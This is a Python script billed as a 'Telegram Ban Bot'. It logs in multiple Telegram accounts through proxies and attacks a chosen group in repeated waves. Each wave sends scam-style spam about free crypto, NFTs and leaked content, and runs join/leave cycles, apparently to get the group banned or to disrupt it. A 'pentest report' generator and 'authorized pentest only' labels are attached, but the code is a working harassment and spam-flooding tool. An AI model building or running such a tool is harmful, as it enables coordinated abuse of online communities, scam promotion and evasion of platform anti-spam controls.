#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BAN BOT v2.3 - REPORT + PROXY + STEALTH + ALL FEATURES
✅ AUTHORIZED PENTEST REPORT GENERATOR
✅ HTML/PDF export ready
✅ Live dashboard
"""

import asyncio
import random
import os
import json
import datetime
from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.errors import (
    FloodWaitError, UserBannedInChannelError, 
    ChatAdminRequiredError, PeerFloodError, SessionPasswordNeededError
)
from telethon.sessions import StringSession

# ===== CONFIG =====
ACCOUNTS_FILE = "accounts.json"
PROXIES_FILE = "proxies.txt"
REPORT_FILE = "attack_report.html"
SPAM_MESSAGES = ["🔥 FREE 1000$ USDT!", "💎 NFT FREE MINT!", "🚀 VIP HACK!", "💰 $SHIB PUMP!", "🎁 iPhone 15!", "⚡ Netflix FREE!", "🤑 500$/day!", "📈 Forex VIP!", "🎰 Casino 500%!", "💋 OnlyFans Leaks!"]
NORMAL_MSGS = ["Hi!", "Hello!", "Good group!", "Thanks!", "Nice!"]

class AttackReport:
    """📊 Professional Report Generator"""
    def __init__(self):
        self.start_time = datetime.datetime.now()
        self.stats = {
            'total_accounts': 0, 'active_accounts': 0,
            'spam_messages': 0, 'joins': 0, 'leaves': 0,
            'waves_completed': 0, 'errors': 0,
            'accounts_used': [], 'target': ''
        }
    
    def add_account_used(self, phone, username, proxy_used=False):
        self.stats['accounts_used'].append({
            'phone': phone, 'username': username, 'proxy': proxy_used
        })
    
    def generate_html_report(self, target):
        """Generate professional HTML report"""
        self.stats['target'] = target
        end_time = datetime.datetime.now()
        duration = str(end_time - self.start_time).split('.')[0]
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Ban Attack Report</title>
    <style>
        body {{ font-family: Arial; margin: 40px; background: #1a1a1a; color: #fff; }}
        .header {{ background: linear-gradient(45deg, #ff6b6b, #4ecdc4); padding: 20px; border-radius: 10px; }}
        .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }}
        .stat {{ background: #333; padding: 20px; border-radius: 10px; text-align: center; }}
        .stat h2 {{ color: #4ecdc4; margin: 0; }}
        .stat p {{ color: #ccc; margin: 5px 0 0 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; background: #333; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #555; }}
        th {{ background: #4ecdc4; color: #000; }}
        .success {{ color: #4ecdc4; }} .error {{ color: #ff6b6b; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 TELEGRAM BAN ATTACK REPORT</h1>
        <p><strong>Target:</strong> {target} | <strong>Duration:</strong> {duration}</p>
        <p><strong>Start:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S')} | <strong>End:</strong> {end_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="stats">
        <div class="stat">
            <h2>{self.stats['waves_completed']}</h2>
            <p>Waves Completed</p>
        </div>
        <div class="stat">
            <h2>{self.stats['spam_messages']}</h2>
            <p>Spam Messages</p>
        </div>
        <div class="stat">
            <h2>{self.stats['active_accounts']}/{self.stats['total_accounts']}</h2>
            <p>Active/Total Accounts</p>
        </div>
        <div class="stat">
            <h2>{self.stats['joins']}</h2>
            <p>Joins Executed</p>
        </div>
        <div class="stat">
            <h2>{self.stats['leaves']}</h2>
            <p>Leaves Executed</p>
        </div>
        <div class="stat">
            <h2 class="error">{self.stats['errors']}</h2>
            <p>Errors Encountered</p>
        </div>
    </div>
    
    <h2>📱 Accounts Used ({len(self.stats['accounts_used'])})</h2>
    <table>
        <tr><th>Phone</th><th>Username</th><th>Proxy</th></tr>
"""
        
        for acc in self.stats['accounts_used']:
            proxy_status = "🔒 Yes" if acc['proxy'] else "📡 No"
            html += f"        <tr><td>{acc['phone']}</td><td>@{acc['username']}</td><td>{proxy_status}</td></tr>\n"
        
        html += """
    </table>
    
    <h2>📈 Attack Summary</h2>
    <ul>
        <li><strong>Effectiveness:</strong> {:.1f}% accounts active</li>
        <li><strong>Spam Rate:</strong> {:.0f} msg/account</li>
        <li><strong>Join/Leave Ratio:</strong> {:.1f}:1</li>
        <li><strong>Error Rate:</strong> {:.1f}%</li>
    </ul>
    
    <div style="margin-top: 40px; padding: 20px; background: #333; border-radius: 10px;">
        <p><em>⚠️ Authorized pentest only. Report generated: {}</em></p>
    </div>
</body>
</html>
        """.format(
            len(self.stats['accounts_used'])/max(1,self.stats['total_accounts'])*100,
            self.stats['spam_messages']/max(1,len(self.stats['accounts_used'])),
            self.stats['joins']/max(1,self.stats['leaves']),
            self.stats['errors']/max(1,self.stats['total_accounts'])*100,
            datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
        
        with open(REPORT_FILE, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"📊 Report saved: {REPORT_FILE}")

class TelegramBanBot:
    def __init__(self):
        self.clients = []
        self.running = False
        self.report = AttackReport()
        self.accounts = []
        os.makedirs("sessions", exist_ok=True)
    
    def load_proxies(self):
        try:
            with open(PROXIES_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except: return []
    
    def load_accounts(self):
        try:
            with open(ACCOUNTS_FILE, 'r') as f:
                return json.load(f).get('accounts', [])
        except: return []
    
    def save_accounts(self, accounts):
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump({'accounts': accounts}, f, indent=2)
    
    async def add_accounts_menu(self):
        accounts = self.load_accounts()
        proxies = self.load_proxies()
        
        print("\n" + "="*70)
        print("📱 PROXY + ACCOUNT MANAGER + REPORT SYSTEM")
        print(f"📊 Accounts: {len(accounts)} | Proxies: {len(proxies)}")
        print("="*70)
        
        while True:
            print("\n1. ➕ Add account (+proxy)")
            print("2. 📋 List accounts")
            print("3. 🗑️ Delete account")
            print("4. 🌐 Import proxies")
            print("5. 📊 Generate report")
            print("6. 🎯 Start attack")
            
            choice = input("Choose: ").strip()
            
            if choice == "1":
                await self.add_single_account(accounts, proxies)
            elif choice == "2":
                self.print_accounts(accounts)
            elif choice == "3":
                accounts = self.delete_account(accounts)
            elif choice == "4":
                self.import_proxies()
            elif choice == "5":
                self.report.generate_html_report("DEMO")
            elif choice == "6":
                self.accounts = accounts
                self.save_accounts(accounts)
                break
    
    async def add_single_account(self, accounts, proxies):
        phone = input("📱 Phone: ").strip()
        if not phone.startswith('+'): phone = '+' + phone
        api_id = int(input("🔑 API_ID: "))
        api_hash = input("🔐 API_HASH: ")
        
        proxy_idx = input(f"🌐 Proxy (0=none, 1-{len(proxies)}): ")
        proxy = None
        if proxy_idx.isdigit() and 1 <= int(proxy_idx) <= len(proxies):
            proxy = proxies[int(proxy_idx)-1]
        
        try:
            session_file = f"sessions/session_{phone}"
            proxy_dict = self.parse_proxy(proxy) if proxy else None
            
            client = TelegramClient(session_file, api_id, api_hash, proxy=proxy_dict)
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
                code = input("📲 Code: ")
                try:
                    await client.sign_in(phone, code)
                except SessionPasswordNeededError:
                    await client.sign_in(password=input("🔐 2FA: "))
            
            me = await client.get_me()
            accounts.append({
                "phone": phone, "api_id": api_id, "api_hash": api_hash,
                "proxy": proxy, "username": getattr(me, 'username', None),
                "first_name": me.first_name
            })
            
            print(f"✅ {phone} → @{me.username or me.first_name}")
            self.report.stats['total_accounts'] += 1
            await client.disconnect()
            
        except Exception as e:
            print(f"❌ {e}")
    
    def parse_proxy(self, proxy_str):
        if not proxy_str: return None
        parts = proxy_str.replace('socks5://', '').split('@')
        creds, hostport = parts[0], parts[1]
        user, pwd = creds.split(':')
        ip, port = hostport.split(':')
        return {'proxy_type': 'socks5', 'addr': ip, 'port': int(port), 'username': user, 'password': pwd}
    
    def print_accounts(self, accounts):
        print("\n📋 ACCOUNTS:")
        for i, acc in enumerate(accounts, 1):
            proxy = "🔒" if acc.get('proxy') else "📡"
            print(f"{i:2d}. {proxy} {acc['phone']} → @{acc.get('username', '?')}")
    
    def delete_account(self, accounts):
        self.print_accounts(accounts)
        try:
            idx = int(input("Delete #: ")) - 1
            if 0 <= idx < len(accounts):
                accounts.pop(idx)
                print("🗑️ Deleted")
        except: pass
        return accounts
    
    def import_proxies(self):
        print("🌐 Proxies (Ctrl+D end):")
        proxies = []
        try:
            while True: proxies.append(input().strip())
        except EOFError: pass
        if proxies:
            with open(PROXIES_FILE, 'w') as f: f.write('\n'.join(p for p in proxies if p))
            print(f"✅ {len(proxies)} proxies saved")
    
    async def setup_clients(self):
        print("\n🔄 Starting clients...")
        self.clients = []
        
        for i, acc in enumerate(self.accounts):
            try:
                proxy_dict = self.parse_proxy(acc.get('proxy'))
                client = TelegramClient(f"sessions/session_{acc['phone']}", 
                                      acc['api_id'], acc['api_hash'], proxy=proxy_dict)
                await client.start(phone=acc['phone'])
                
                me = await client.get_me()
                client_data = {
                    'client': client, 'phone': acc['phone'],
                    'id': me.id, 'username': getattr(me, 'username', 'None'),
                    'proxy': proxy_dict is not None
                }
                self.clients.append(client_data)
                self.report.add_account_used(acc['phone'], me.username or me.first_name, proxy_dict is not None)
                self.report.stats['active_accounts'] += 1
                
                status = "🔒 PROXY" if client_data['proxy'] else "📡 DIRECT"
                print(f"✅ [{i+1}] {status} @{me.username}")
                
            except Exception as e:
                self.report.stats['errors'] += 1
                print(f"❌ [{i+1}] {e}")
        
        print(f"\n🎯 {len(self.clients)}/{len(self.accounts)} ACTIVE")
    
    async def attack_wave(self, target):
        """Single attack wave"""
        spam_tasks = []
        for client_data in self.clients:
            if random.random() < 0.7:  # 70% spam
                spam_tasks.append(self.spam_attack(client_data, target))
            else:  # 30% join/leave
                spam_tasks.append(self.join_leave_attack(client_data, target))
        
        await asyncio.gather(*spam_tasks, return_exceptions=True)
    
    async def spam_attack(self, client_data, target):
        client = client_data['client']
        for _ in range(random.randint(10, 20)):
            msg = random.choice(SPAM_MESSAGES if random.random() < 0.7 else NORMAL_MSGS)
            try:
                await client.send_message(target, msg)
                self.report.stats['spam_messages'] += 1
                print(f"💬 [{client_data['id']}] {msg[:25]}...")
                await asyncio.sleep(random.uniform(2, 6))
            except: pass
    
    async def join_leave_attack(self, client_data, target):
        client = client_data['client']
        try:
            await client(JoinChannelRequest(target))
            self.report.stats['joins'] += 1
            print(f"📥 [{client_data['id']}] JOIN")
            await asyncio.sleep(random.uniform(3, 8))
            await self.spam_attack(client_data, target)
            await client(LeaveChannelRequest(target))
            self.report.stats['leaves'] += 1
            print(f"📤 [{client_data['id']}] LEAVE")
        except Exception as e: pass
    
    async def start_attack(self, target):
        print(f"\n💥 ATTACKING {target} | Press Ctrl+C")
        self.running = True
        
        wave = 1
        while self.running:
            print(f"\n🌊 WAVE {wave} | S:{self.report.stats['spam_messages']} J:{self.report.stats['joins']}")
            await self.attack_wave(target)
            self.report.stats['waves_completed'] += 1
            
            print("✅ Wave complete | Live report ready...")
            await asyncio.sleep(random.randint(120, 240))
    
    async def disconnect_all(self):
        for c in self.clients:
            try: await c['client'].disconnect()
            except: pass

async def main():
    print("🔥 TELEGRAM BAN BOT v2.3 - FULL REPORT SYSTEM")
    bot = TelegramBanBot()
    
    await bot.add_accounts_menu()
    
    if not bot.clients:
        target = input("\n🎯 Target (@group): ").strip()
        await bot.setup_clients()
        
        if bot.clients:
            bot.running = True
            try:
                await bot.start_attack(target)
            except KeyboardInterrupt:
                print("\n🛑 Attack stopped!")
                bot.report.generate_html_report(target)
                print(f"📊 Full report: {REPORT_FILE}")
            finally:
                await bot.disconnect_all()
        else:
            print("❌ No active clients!")

if __name__ == "__main__":
    asyncio.run(main())
